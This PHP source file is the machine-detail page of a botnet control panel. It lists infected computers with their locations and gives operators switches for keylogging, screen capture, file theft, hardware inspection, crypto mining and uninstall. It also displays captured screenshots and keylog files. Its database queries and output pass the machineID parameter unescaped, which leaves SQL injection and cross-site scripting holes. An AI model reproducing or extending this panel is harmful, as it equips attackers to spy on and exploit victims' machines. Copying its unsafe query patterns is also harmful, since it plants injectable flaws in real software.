<?php 
if(!isset($_GET['machineID']) || (isset($_GET['machineID']) && $_GET['machineID']=="")){
	echo "<script>window.location.replace(\"/controlpanel/?section=botnet\");</script>";
}
?>
<style>
.demo-card-wide.mdl-card {
	width: 100%;
	min-height: inherit;
	padding: 15px;
	margin-bottom: 5px;
}
.demo-card-wide > .mdl-card__menu {
	color: #fff;
}
td{
		border:1px solid;
	}
</style>
 
<div class="mdl-grid demo-content">
  <div class="demo-card-wide mdl-card mdl-shadow--2dp">
	  <h4>Machine#<?php echo $_GET['machineID'] ?></h4>
	<table class="mdl-data-table mdl-js-data-table mdl-shadow--2dp">
	  <thead>
		<tr>
		  <th>System</th>
		  <th>SW Version</th>
		  <th>Coordinates</th>
		  <th>Signal</th>
		  <th>Note</th>
		  <th>Status</th>
		</tr>
	  </thead>
	  <tbody>
		  <?php 
			$sql="SELECT * FROM botnet WHERE machineID='".$_GET['machineID']."'";
			$result = mysqli_query($conn, $sql);
			while($row = $result->fetch_assoc()) {
					if($row['system']=="WINDOWS")
					$systemIcon="windows";
				else if($row['system']=="MACOS")
					$systemIcon="apple";
				else if($row['system']=="LINUX")
					$systemIcon="linux";
				else if($row['system']=="ANDROID")
					$systemIcon="android";
				else if($row['system']=="IOS")
					$systemIcon="mobile";
				echo '<tr id="'.$row['machineID'].'">
						<td><i class="fab fa-'.$systemIcon.' fa-2x"></i></td>
						<td>'.$row['programVersion'].'</td>
						<td><a href="https://www.google.it/maps/@'.$row['latitude'].','.$row['longitude'].',19z" target="_blank">Lat: '.$row['latitude'].'<br />Lon: '.$row['longitude'].'</a></td>
						<td>First: '.$row['first_signal'].'<br/>Last: '.$row['last_signal'].'</td>
						<td>
						
						<div class="mdl-textfield mdl-js-textfield" style="padding:0px;">
							<input id="noteInput" class="mdl-textfield__input" type="text" value="'.$row['note'].'">
						  </div>
						  <button onclick="updateNote(\''.$row['machineID'].'\')" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">save</i></button>
						
						</td>
						<td>';if((time()-$row['ordersInterval']) < strtotime($row['last_signal'])) echo '<i class="far fa-check-circle fa-2x"></i>'; else echo '<i class="far fa-times-circle fa-2x"></i>'; echo '</td>
						</tr>
						<tr>
						<td colspan="6" style="text-align:center;">
						
						<button id="commandsBtn" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="commands()"><i id="commandsBtnIcon" style="margin-left: auto; margin-right: auto;" class="fas fa-expand"></i></button>
						
						<button id="specsBtn" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="specs()"><i id="specsBtnIcon" style="margin-left: auto; margin-right: auto;" class="fas fa-microchip"></i></button>
						
						<button id="filesBtn" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="goToFileManager()"><i id="filesBtnIcon" style="margin-left: auto; margin-right: auto;" class="fas fa-file-upload"></i></button>
						
						<button id="machineManagerBtn" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="goToMachineManager()"><i id="machineManagerBtnIcon" style="margin-left: auto; margin-right: auto;" class="fas fa-folder-open"></i></button>
						
						<!--<button id="screensBtn" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="screens()"><i id="screensBtnIcon" style="margin-left: auto; margin-right: auto;" class="fas fa-images"></i></button>
						
						<button id="keysBtn" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="keys()"><i id="keysBtnIcon" style="margin-left: auto; margin-right: auto;" class="fas fa-keyboard"></i></button>-->
						
						<button id="removeBtn" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect" onclick="removeMachine(\''.$row['machineID'].'\')"><i style="margin-left: auto; margin-right: auto;" class="fas fa-trash-alt"></i></button>
						
						</td>
					  </tr>';
			}
			?>
	  </tbody>
	</table>
  </div>
	
  <?php 
	$sql="SELECT * FROM botnet WHERE machineID='".$_GET['machineID']."'";
	$result = mysqli_query($conn, $sql);
	while($row = $result->fetch_assoc()) {
		echo '<div id="commandsTab" class="commands demo-card-wide mdl-card mdl-shadow--2dp" style="display:none;">
		<h4>Commands</h4>
		<table class="mdl-data-table mdl-js-data-table mdl-shadow--2dp">
	  <thead>
		<tr>
		  <th>Orders Interval (s)</th>
		  <th>Inspect HW</th>
		  <th>Inspect Files</th>
		  <th>Keylogger</th>
		  <th>Screen Capture</th>
		  <th>Screen Interval (s)</th>
		  <th>Files Capture</th>
		  <th>Mining</th>
		  <th>Uninstall</th>
		</tr>
	  </thead>
	  <tbody>
		 <tr>
			<td>
			
			 <div class="mdl-textfield mdl-js-textfield" style="padding:0px; width:50px;">
				<input id="ordersIntervalInput" class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" value="'.$row['ordersInterval'].'">
			  </div>
			  <button onclick="updateOrdersInterval(\''.$row['machineID'].'\')" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">save</i></button>
			
			</td>
			<td><label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="inspectHardware-'.$row['machineID'].'">
					<input onchange="updateOrder(this)" type="checkbox" id="inspectHardware-'.$row['machineID'].'" class="mdl-switch__input" ';if($row['inspectHardware']) echo 'checked';echo'>
				</label>
			</td>
			<td><label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="inspectFiles-'.$row['machineID'].'">
					<input onchange="updateOrder(this)" type="checkbox" id="inspectFiles-'.$row['machineID'].'" class="mdl-switch__input" ';if($row['inspectFiles']) echo 'checked';echo'>
				</label>
			</td>
			<td><label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="keylogger-'.$row['machineID'].'">
					<input onchange="updateOrder(this)" type="checkbox" id="keylogger-'.$row['machineID'].'" class="mdl-switch__input" ';if($row['keylogger']) echo 'checked';echo'>
				</label>
			</td>
			<td><label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="screenCapture-'.$row['machineID'].'">
  					<input onchange="updateOrder(this)" type="checkbox" id="screenCapture-'.$row['machineID'].'" class="mdl-switch__input" ';if($row['screenCapture']) echo 'checked';echo'>
				</label>
			</td>
			<td>
			
			  <div class="mdl-textfield mdl-js-textfield" style="padding:0px; width:50px;">
				<input id="screenCaptureIntervalInput" class="mdl-textfield__input" type="text" pattern="-?[0-9]*(\.[0-9]+)?" value="'.$row['screenCaptureInterval'].'">
			  </div>
			  <button onclick="updateScreenCaptureInterval(\''.$row['machineID'].'\')" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">save</i></button>
				  			
			</td>
			<td><label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="filesCapture-'.$row['machineID'].'">
  					<input onchange="updateOrder(this)" type="checkbox" id="filesCapture-'.$row['machineID'].'" class="mdl-switch__input" ';if($row['filesCapture']) echo 'checked';echo'>
				</label>
			</td>
			<td><label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="mining-'.$row['machineID'].'">
  					<input onchange="updateOrder(this)" type="checkbox" id="mining-'.$row['machineID'].'" class="mdl-switch__input" ';if($row['mining']) echo 'checked';echo'>
				</label>
			</td>
			<td><label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="uninstall-'.$row['machineID'].'">
  					<input onchange="updateOrder(this)" type="checkbox" id="uninstall-'.$row['machineID'].'" class="mdl-switch__input" ';if($row['uninstall']) echo 'checked';echo'>
				</label>
		    </td>
		 </tr>
		</tbody>
	</table></div>';
			}
			?>
	 
	
	
  <?php 
	$sql="SELECT * FROM specs WHERE machineID='".$_GET['machineID']."'";
	$result = mysqli_query($conn, $sql);
	while($row = $result->fetch_assoc()) {
		echo '
		<div id="specsTab" style="display:none;" class="specs demo-card-wide mdl-card mdl-shadow--2dp"><h4>Hardware specifications</h4>
		<ul id="specs'.$row['machineID'].'" class="demo-list-item mdl-list">
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="far fa-id-card"></i>Account:<br /> '.nl2br($row['account']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-desktop"></i>Operative System:<br /> '.nl2br($row['os']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-language"></i>Language:<br /> '.nl2br($row['language']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-microchip"></i>Motherboard:<br /> '.nl2br($row['motherboard']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-microchip"></i>RAM:<br /> '.nl2br($row['memory']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-terminal"></i>Bios:<br /> '.nl2br($row['bios']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-microchip"></i>CPU:<br /> '.nl2br($row['cpu']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-gamepad"></i>GPU:<br /> '.nl2br($row['gpu']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-music"></i>Sound cards:<br /> '.nl2br($row['audio']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-globe"></i>Network:<br /> '.nl2br($row['network']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-hdd"></i>Hard drives:<br /> '.nl2br($row['harddrives']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fal fa-dot-circle"></i>CD-ROM:<br /> '.nl2br($row['cdrom']).'</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-video"></i>Webcam:<br /> [not implemented yet]</span>
			</li>
			<li class="mdl-list__item">
				<span class="mdl-list__item-primary-content">
				<i class="fas fa-microphone"></i>Microphone:<br /> [not implemented yet]</span>
			</li>
			</ul>
		</div>
		';
	}
	?>
  
	
		<!--
		<div id="filesTab" style="display:none;" class="files demo-card-wide mdl-card mdl-shadow--2dp">
		<h4>Files</h4>
		<?php
		/*
		echo '<a href="/controlpanel/?section=fileManager&machineID='.$_GET['machineID'].'"/>Files Index</a><hr /> ';
		$dirname = "../machines/".$_GET['machineID']."/files/";
		$images = scandir($dirname);
		$ignore = array(".", "..");
		foreach($images as $curimg){
			if(!in_array($curimg, $ignore)) {
				echo '<a href="'.$dirname.$curimg.'">'.$curimg.'</a> ';
			}
		} 	
		echo '</div>';
		*/
		?>
		-->
		
	
		<div id="screensTab" style="display:none;" class="screens demo-card-wide mdl-card mdl-shadow--2dp">
		<h4>Screens</h4>
		<?php
		$dirname = "../machines/".$_GET['machineID']."/screens/";
		$images = scandir($dirname);
		$ignore = array(".", "..");
		foreach($images as $curimg){
			if(!in_array($curimg, $ignore)) {
				echo '<a href="'.$dirname.$curimg.'"><img style="width:200px;" src="'.$dirname.$curimg.'" alt="" /></a> ';
			}
		} 	
		echo '</div>';
	?>
		
		
		<div id="keysTab" style="display:none;" class="keys demo-card-wide mdl-card mdl-shadow--2dp">
		<h4>Keys</h4>
		<?php
		$dirname = "../machines/".$_GET['machineID']."/keys/";
		$images = scandir($dirname);
		$ignore = array(".", "..");
		foreach($images as $curimg){
			if(!in_array($curimg, $ignore)) {
				echo '<a href="'.$dirname.$curimg.'">'.$curimg.'</a> ';
			}
		} 	
		echo '</div>';
	?>
		
	
	
</div>


<script>

function screens() {
	var screensTab=document.getElementById('screensTab');
	var screensBtn=document.getElementById('screensBtn');
	if(screensTab.style.display=="none"){
		screensTab.style = 'display:inline;';
		screensBtn.classList.add("pressed");
	}else if(screensTab.style.display=="inline"){
		screensTab.style = 'display:none;';
		screensBtn.classList.remove("pressed");
	}
}
/*
function files() {
	var filesTab=document.getElementById('filesTab');
	var filesBtn=document.getElementById('filesBtn');
	if(filesTab.style.display=="none"){
		filesTab.style = 'display:inline;';
		filesBtn.classList.add("pressed");
	}else if(filesTab.style.display=="inline"){
		filesTab.style = 'display:none;';
		filesBtn.classList.remove("pressed");
	}
}
*/
	
function keys() {
	var keysTab=document.getElementById('keysTab');
	var keysBtn=document.getElementById('keysBtn');
	if(keysTab.style.display=="none"){
		keysTab.style = 'display:inline;';
		keysBtn.classList.add("pressed");
	}else if(keysTab.style.display=="inline"){
		keysTab.style = 'display:none;';
		keysBtn.classList.remove("pressed");

	}
}
	
function specs() {
	var specsTab=document.getElementById('specsTab');
	var specsBtn=document.getElementById('specsBtn');
	if(specsTab.style.display=="none"){
		specsTab.style = 'display:inline;';
		specsBtn.classList.add("pressed");
	}else if(specsTab.style.display=="inline"){
		specsTab.style = 'display:none;';
		specsBtn.classList.remove("pressed");

	}
}
	
function commands() {
	var commandsTab=document.getElementById('commandsTab');
	var commandsBtn=document.getElementById('commandsBtn');
	var commandsBtnIcon=document.getElementById('commandsBtnIcon');
	if(commandsTab.style.display=="none"){
		commandsTab.style = 'display:inline;';
		commandsBtnIcon.classList.add("fa-compress");
		commandsBtnIcon.classList.remove("fa-expand");
		commandsBtn.classList.add("pressed");
	}else if(commandsTab.style.display=="inline"){
		commandsTab.style = 'display:none;';
		commandsBtnIcon.classList.add("fa-expand");
		commandsBtnIcon.classList.remove("fa-compress");
		commandsBtn.classList.remove("pressed");
	}
}
	
function updateOrder(e) {
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "operations.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  var typeAndID=e.id.split("-");
  if(e.checked)
	    xhttp.send("operation=updateOrder&type="+typeAndID[0]+"&id="+typeAndID[1]+"&set=1");
  else
	    xhttp.send("operation=updateOrder&type="+typeAndID[0]+"&id="+typeAndID[1]+"&set=0");
}

function updateOrdersInterval(machineID) {
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "operations.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("operation=updateOrdersInterval&id="+machineID+"&value="+document.getElementById('ordersIntervalInput').value);
}
	
function updateScreenCaptureInterval(machineID) {
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "operations.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("operation=updateScreenCaptureInterval&id="+machineID+"&value="+document.getElementById('screenCaptureIntervalInput').value);
}
	
function updateNote(machineID) {
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "operations.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send("operation=updateNote&id="+machineID+"&value="+document.getElementById('noteInput').value);
}
	
function removeMachine(machineID) {
	var retVal = confirm("Confirm to delete this machine?");
   if( retVal == true ){
	 var xhttp = new XMLHttpRequest();
	 xhttp.open("POST", "operations.php", true);
	 xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	 xhttp.send("operation=removeMachine&id="+machineID);
	 window.location.replace("/controlpanel/?section=botnet");
   }
}
	
function goToFileManager() {
	window.location.href ="/controlpanel/?section=fileManager&machineID=<?php echo $_GET["machineID"]; ?>";
}
function goToMachineManager() {
		var win = window.open("/controlpanel/fileManager/fileManager.php?machineID=<?php echo $_GET["machineID"]; ?>", '_blank');
  		win.focus();
	}
	
	$("#commandsBtn").click()
</script>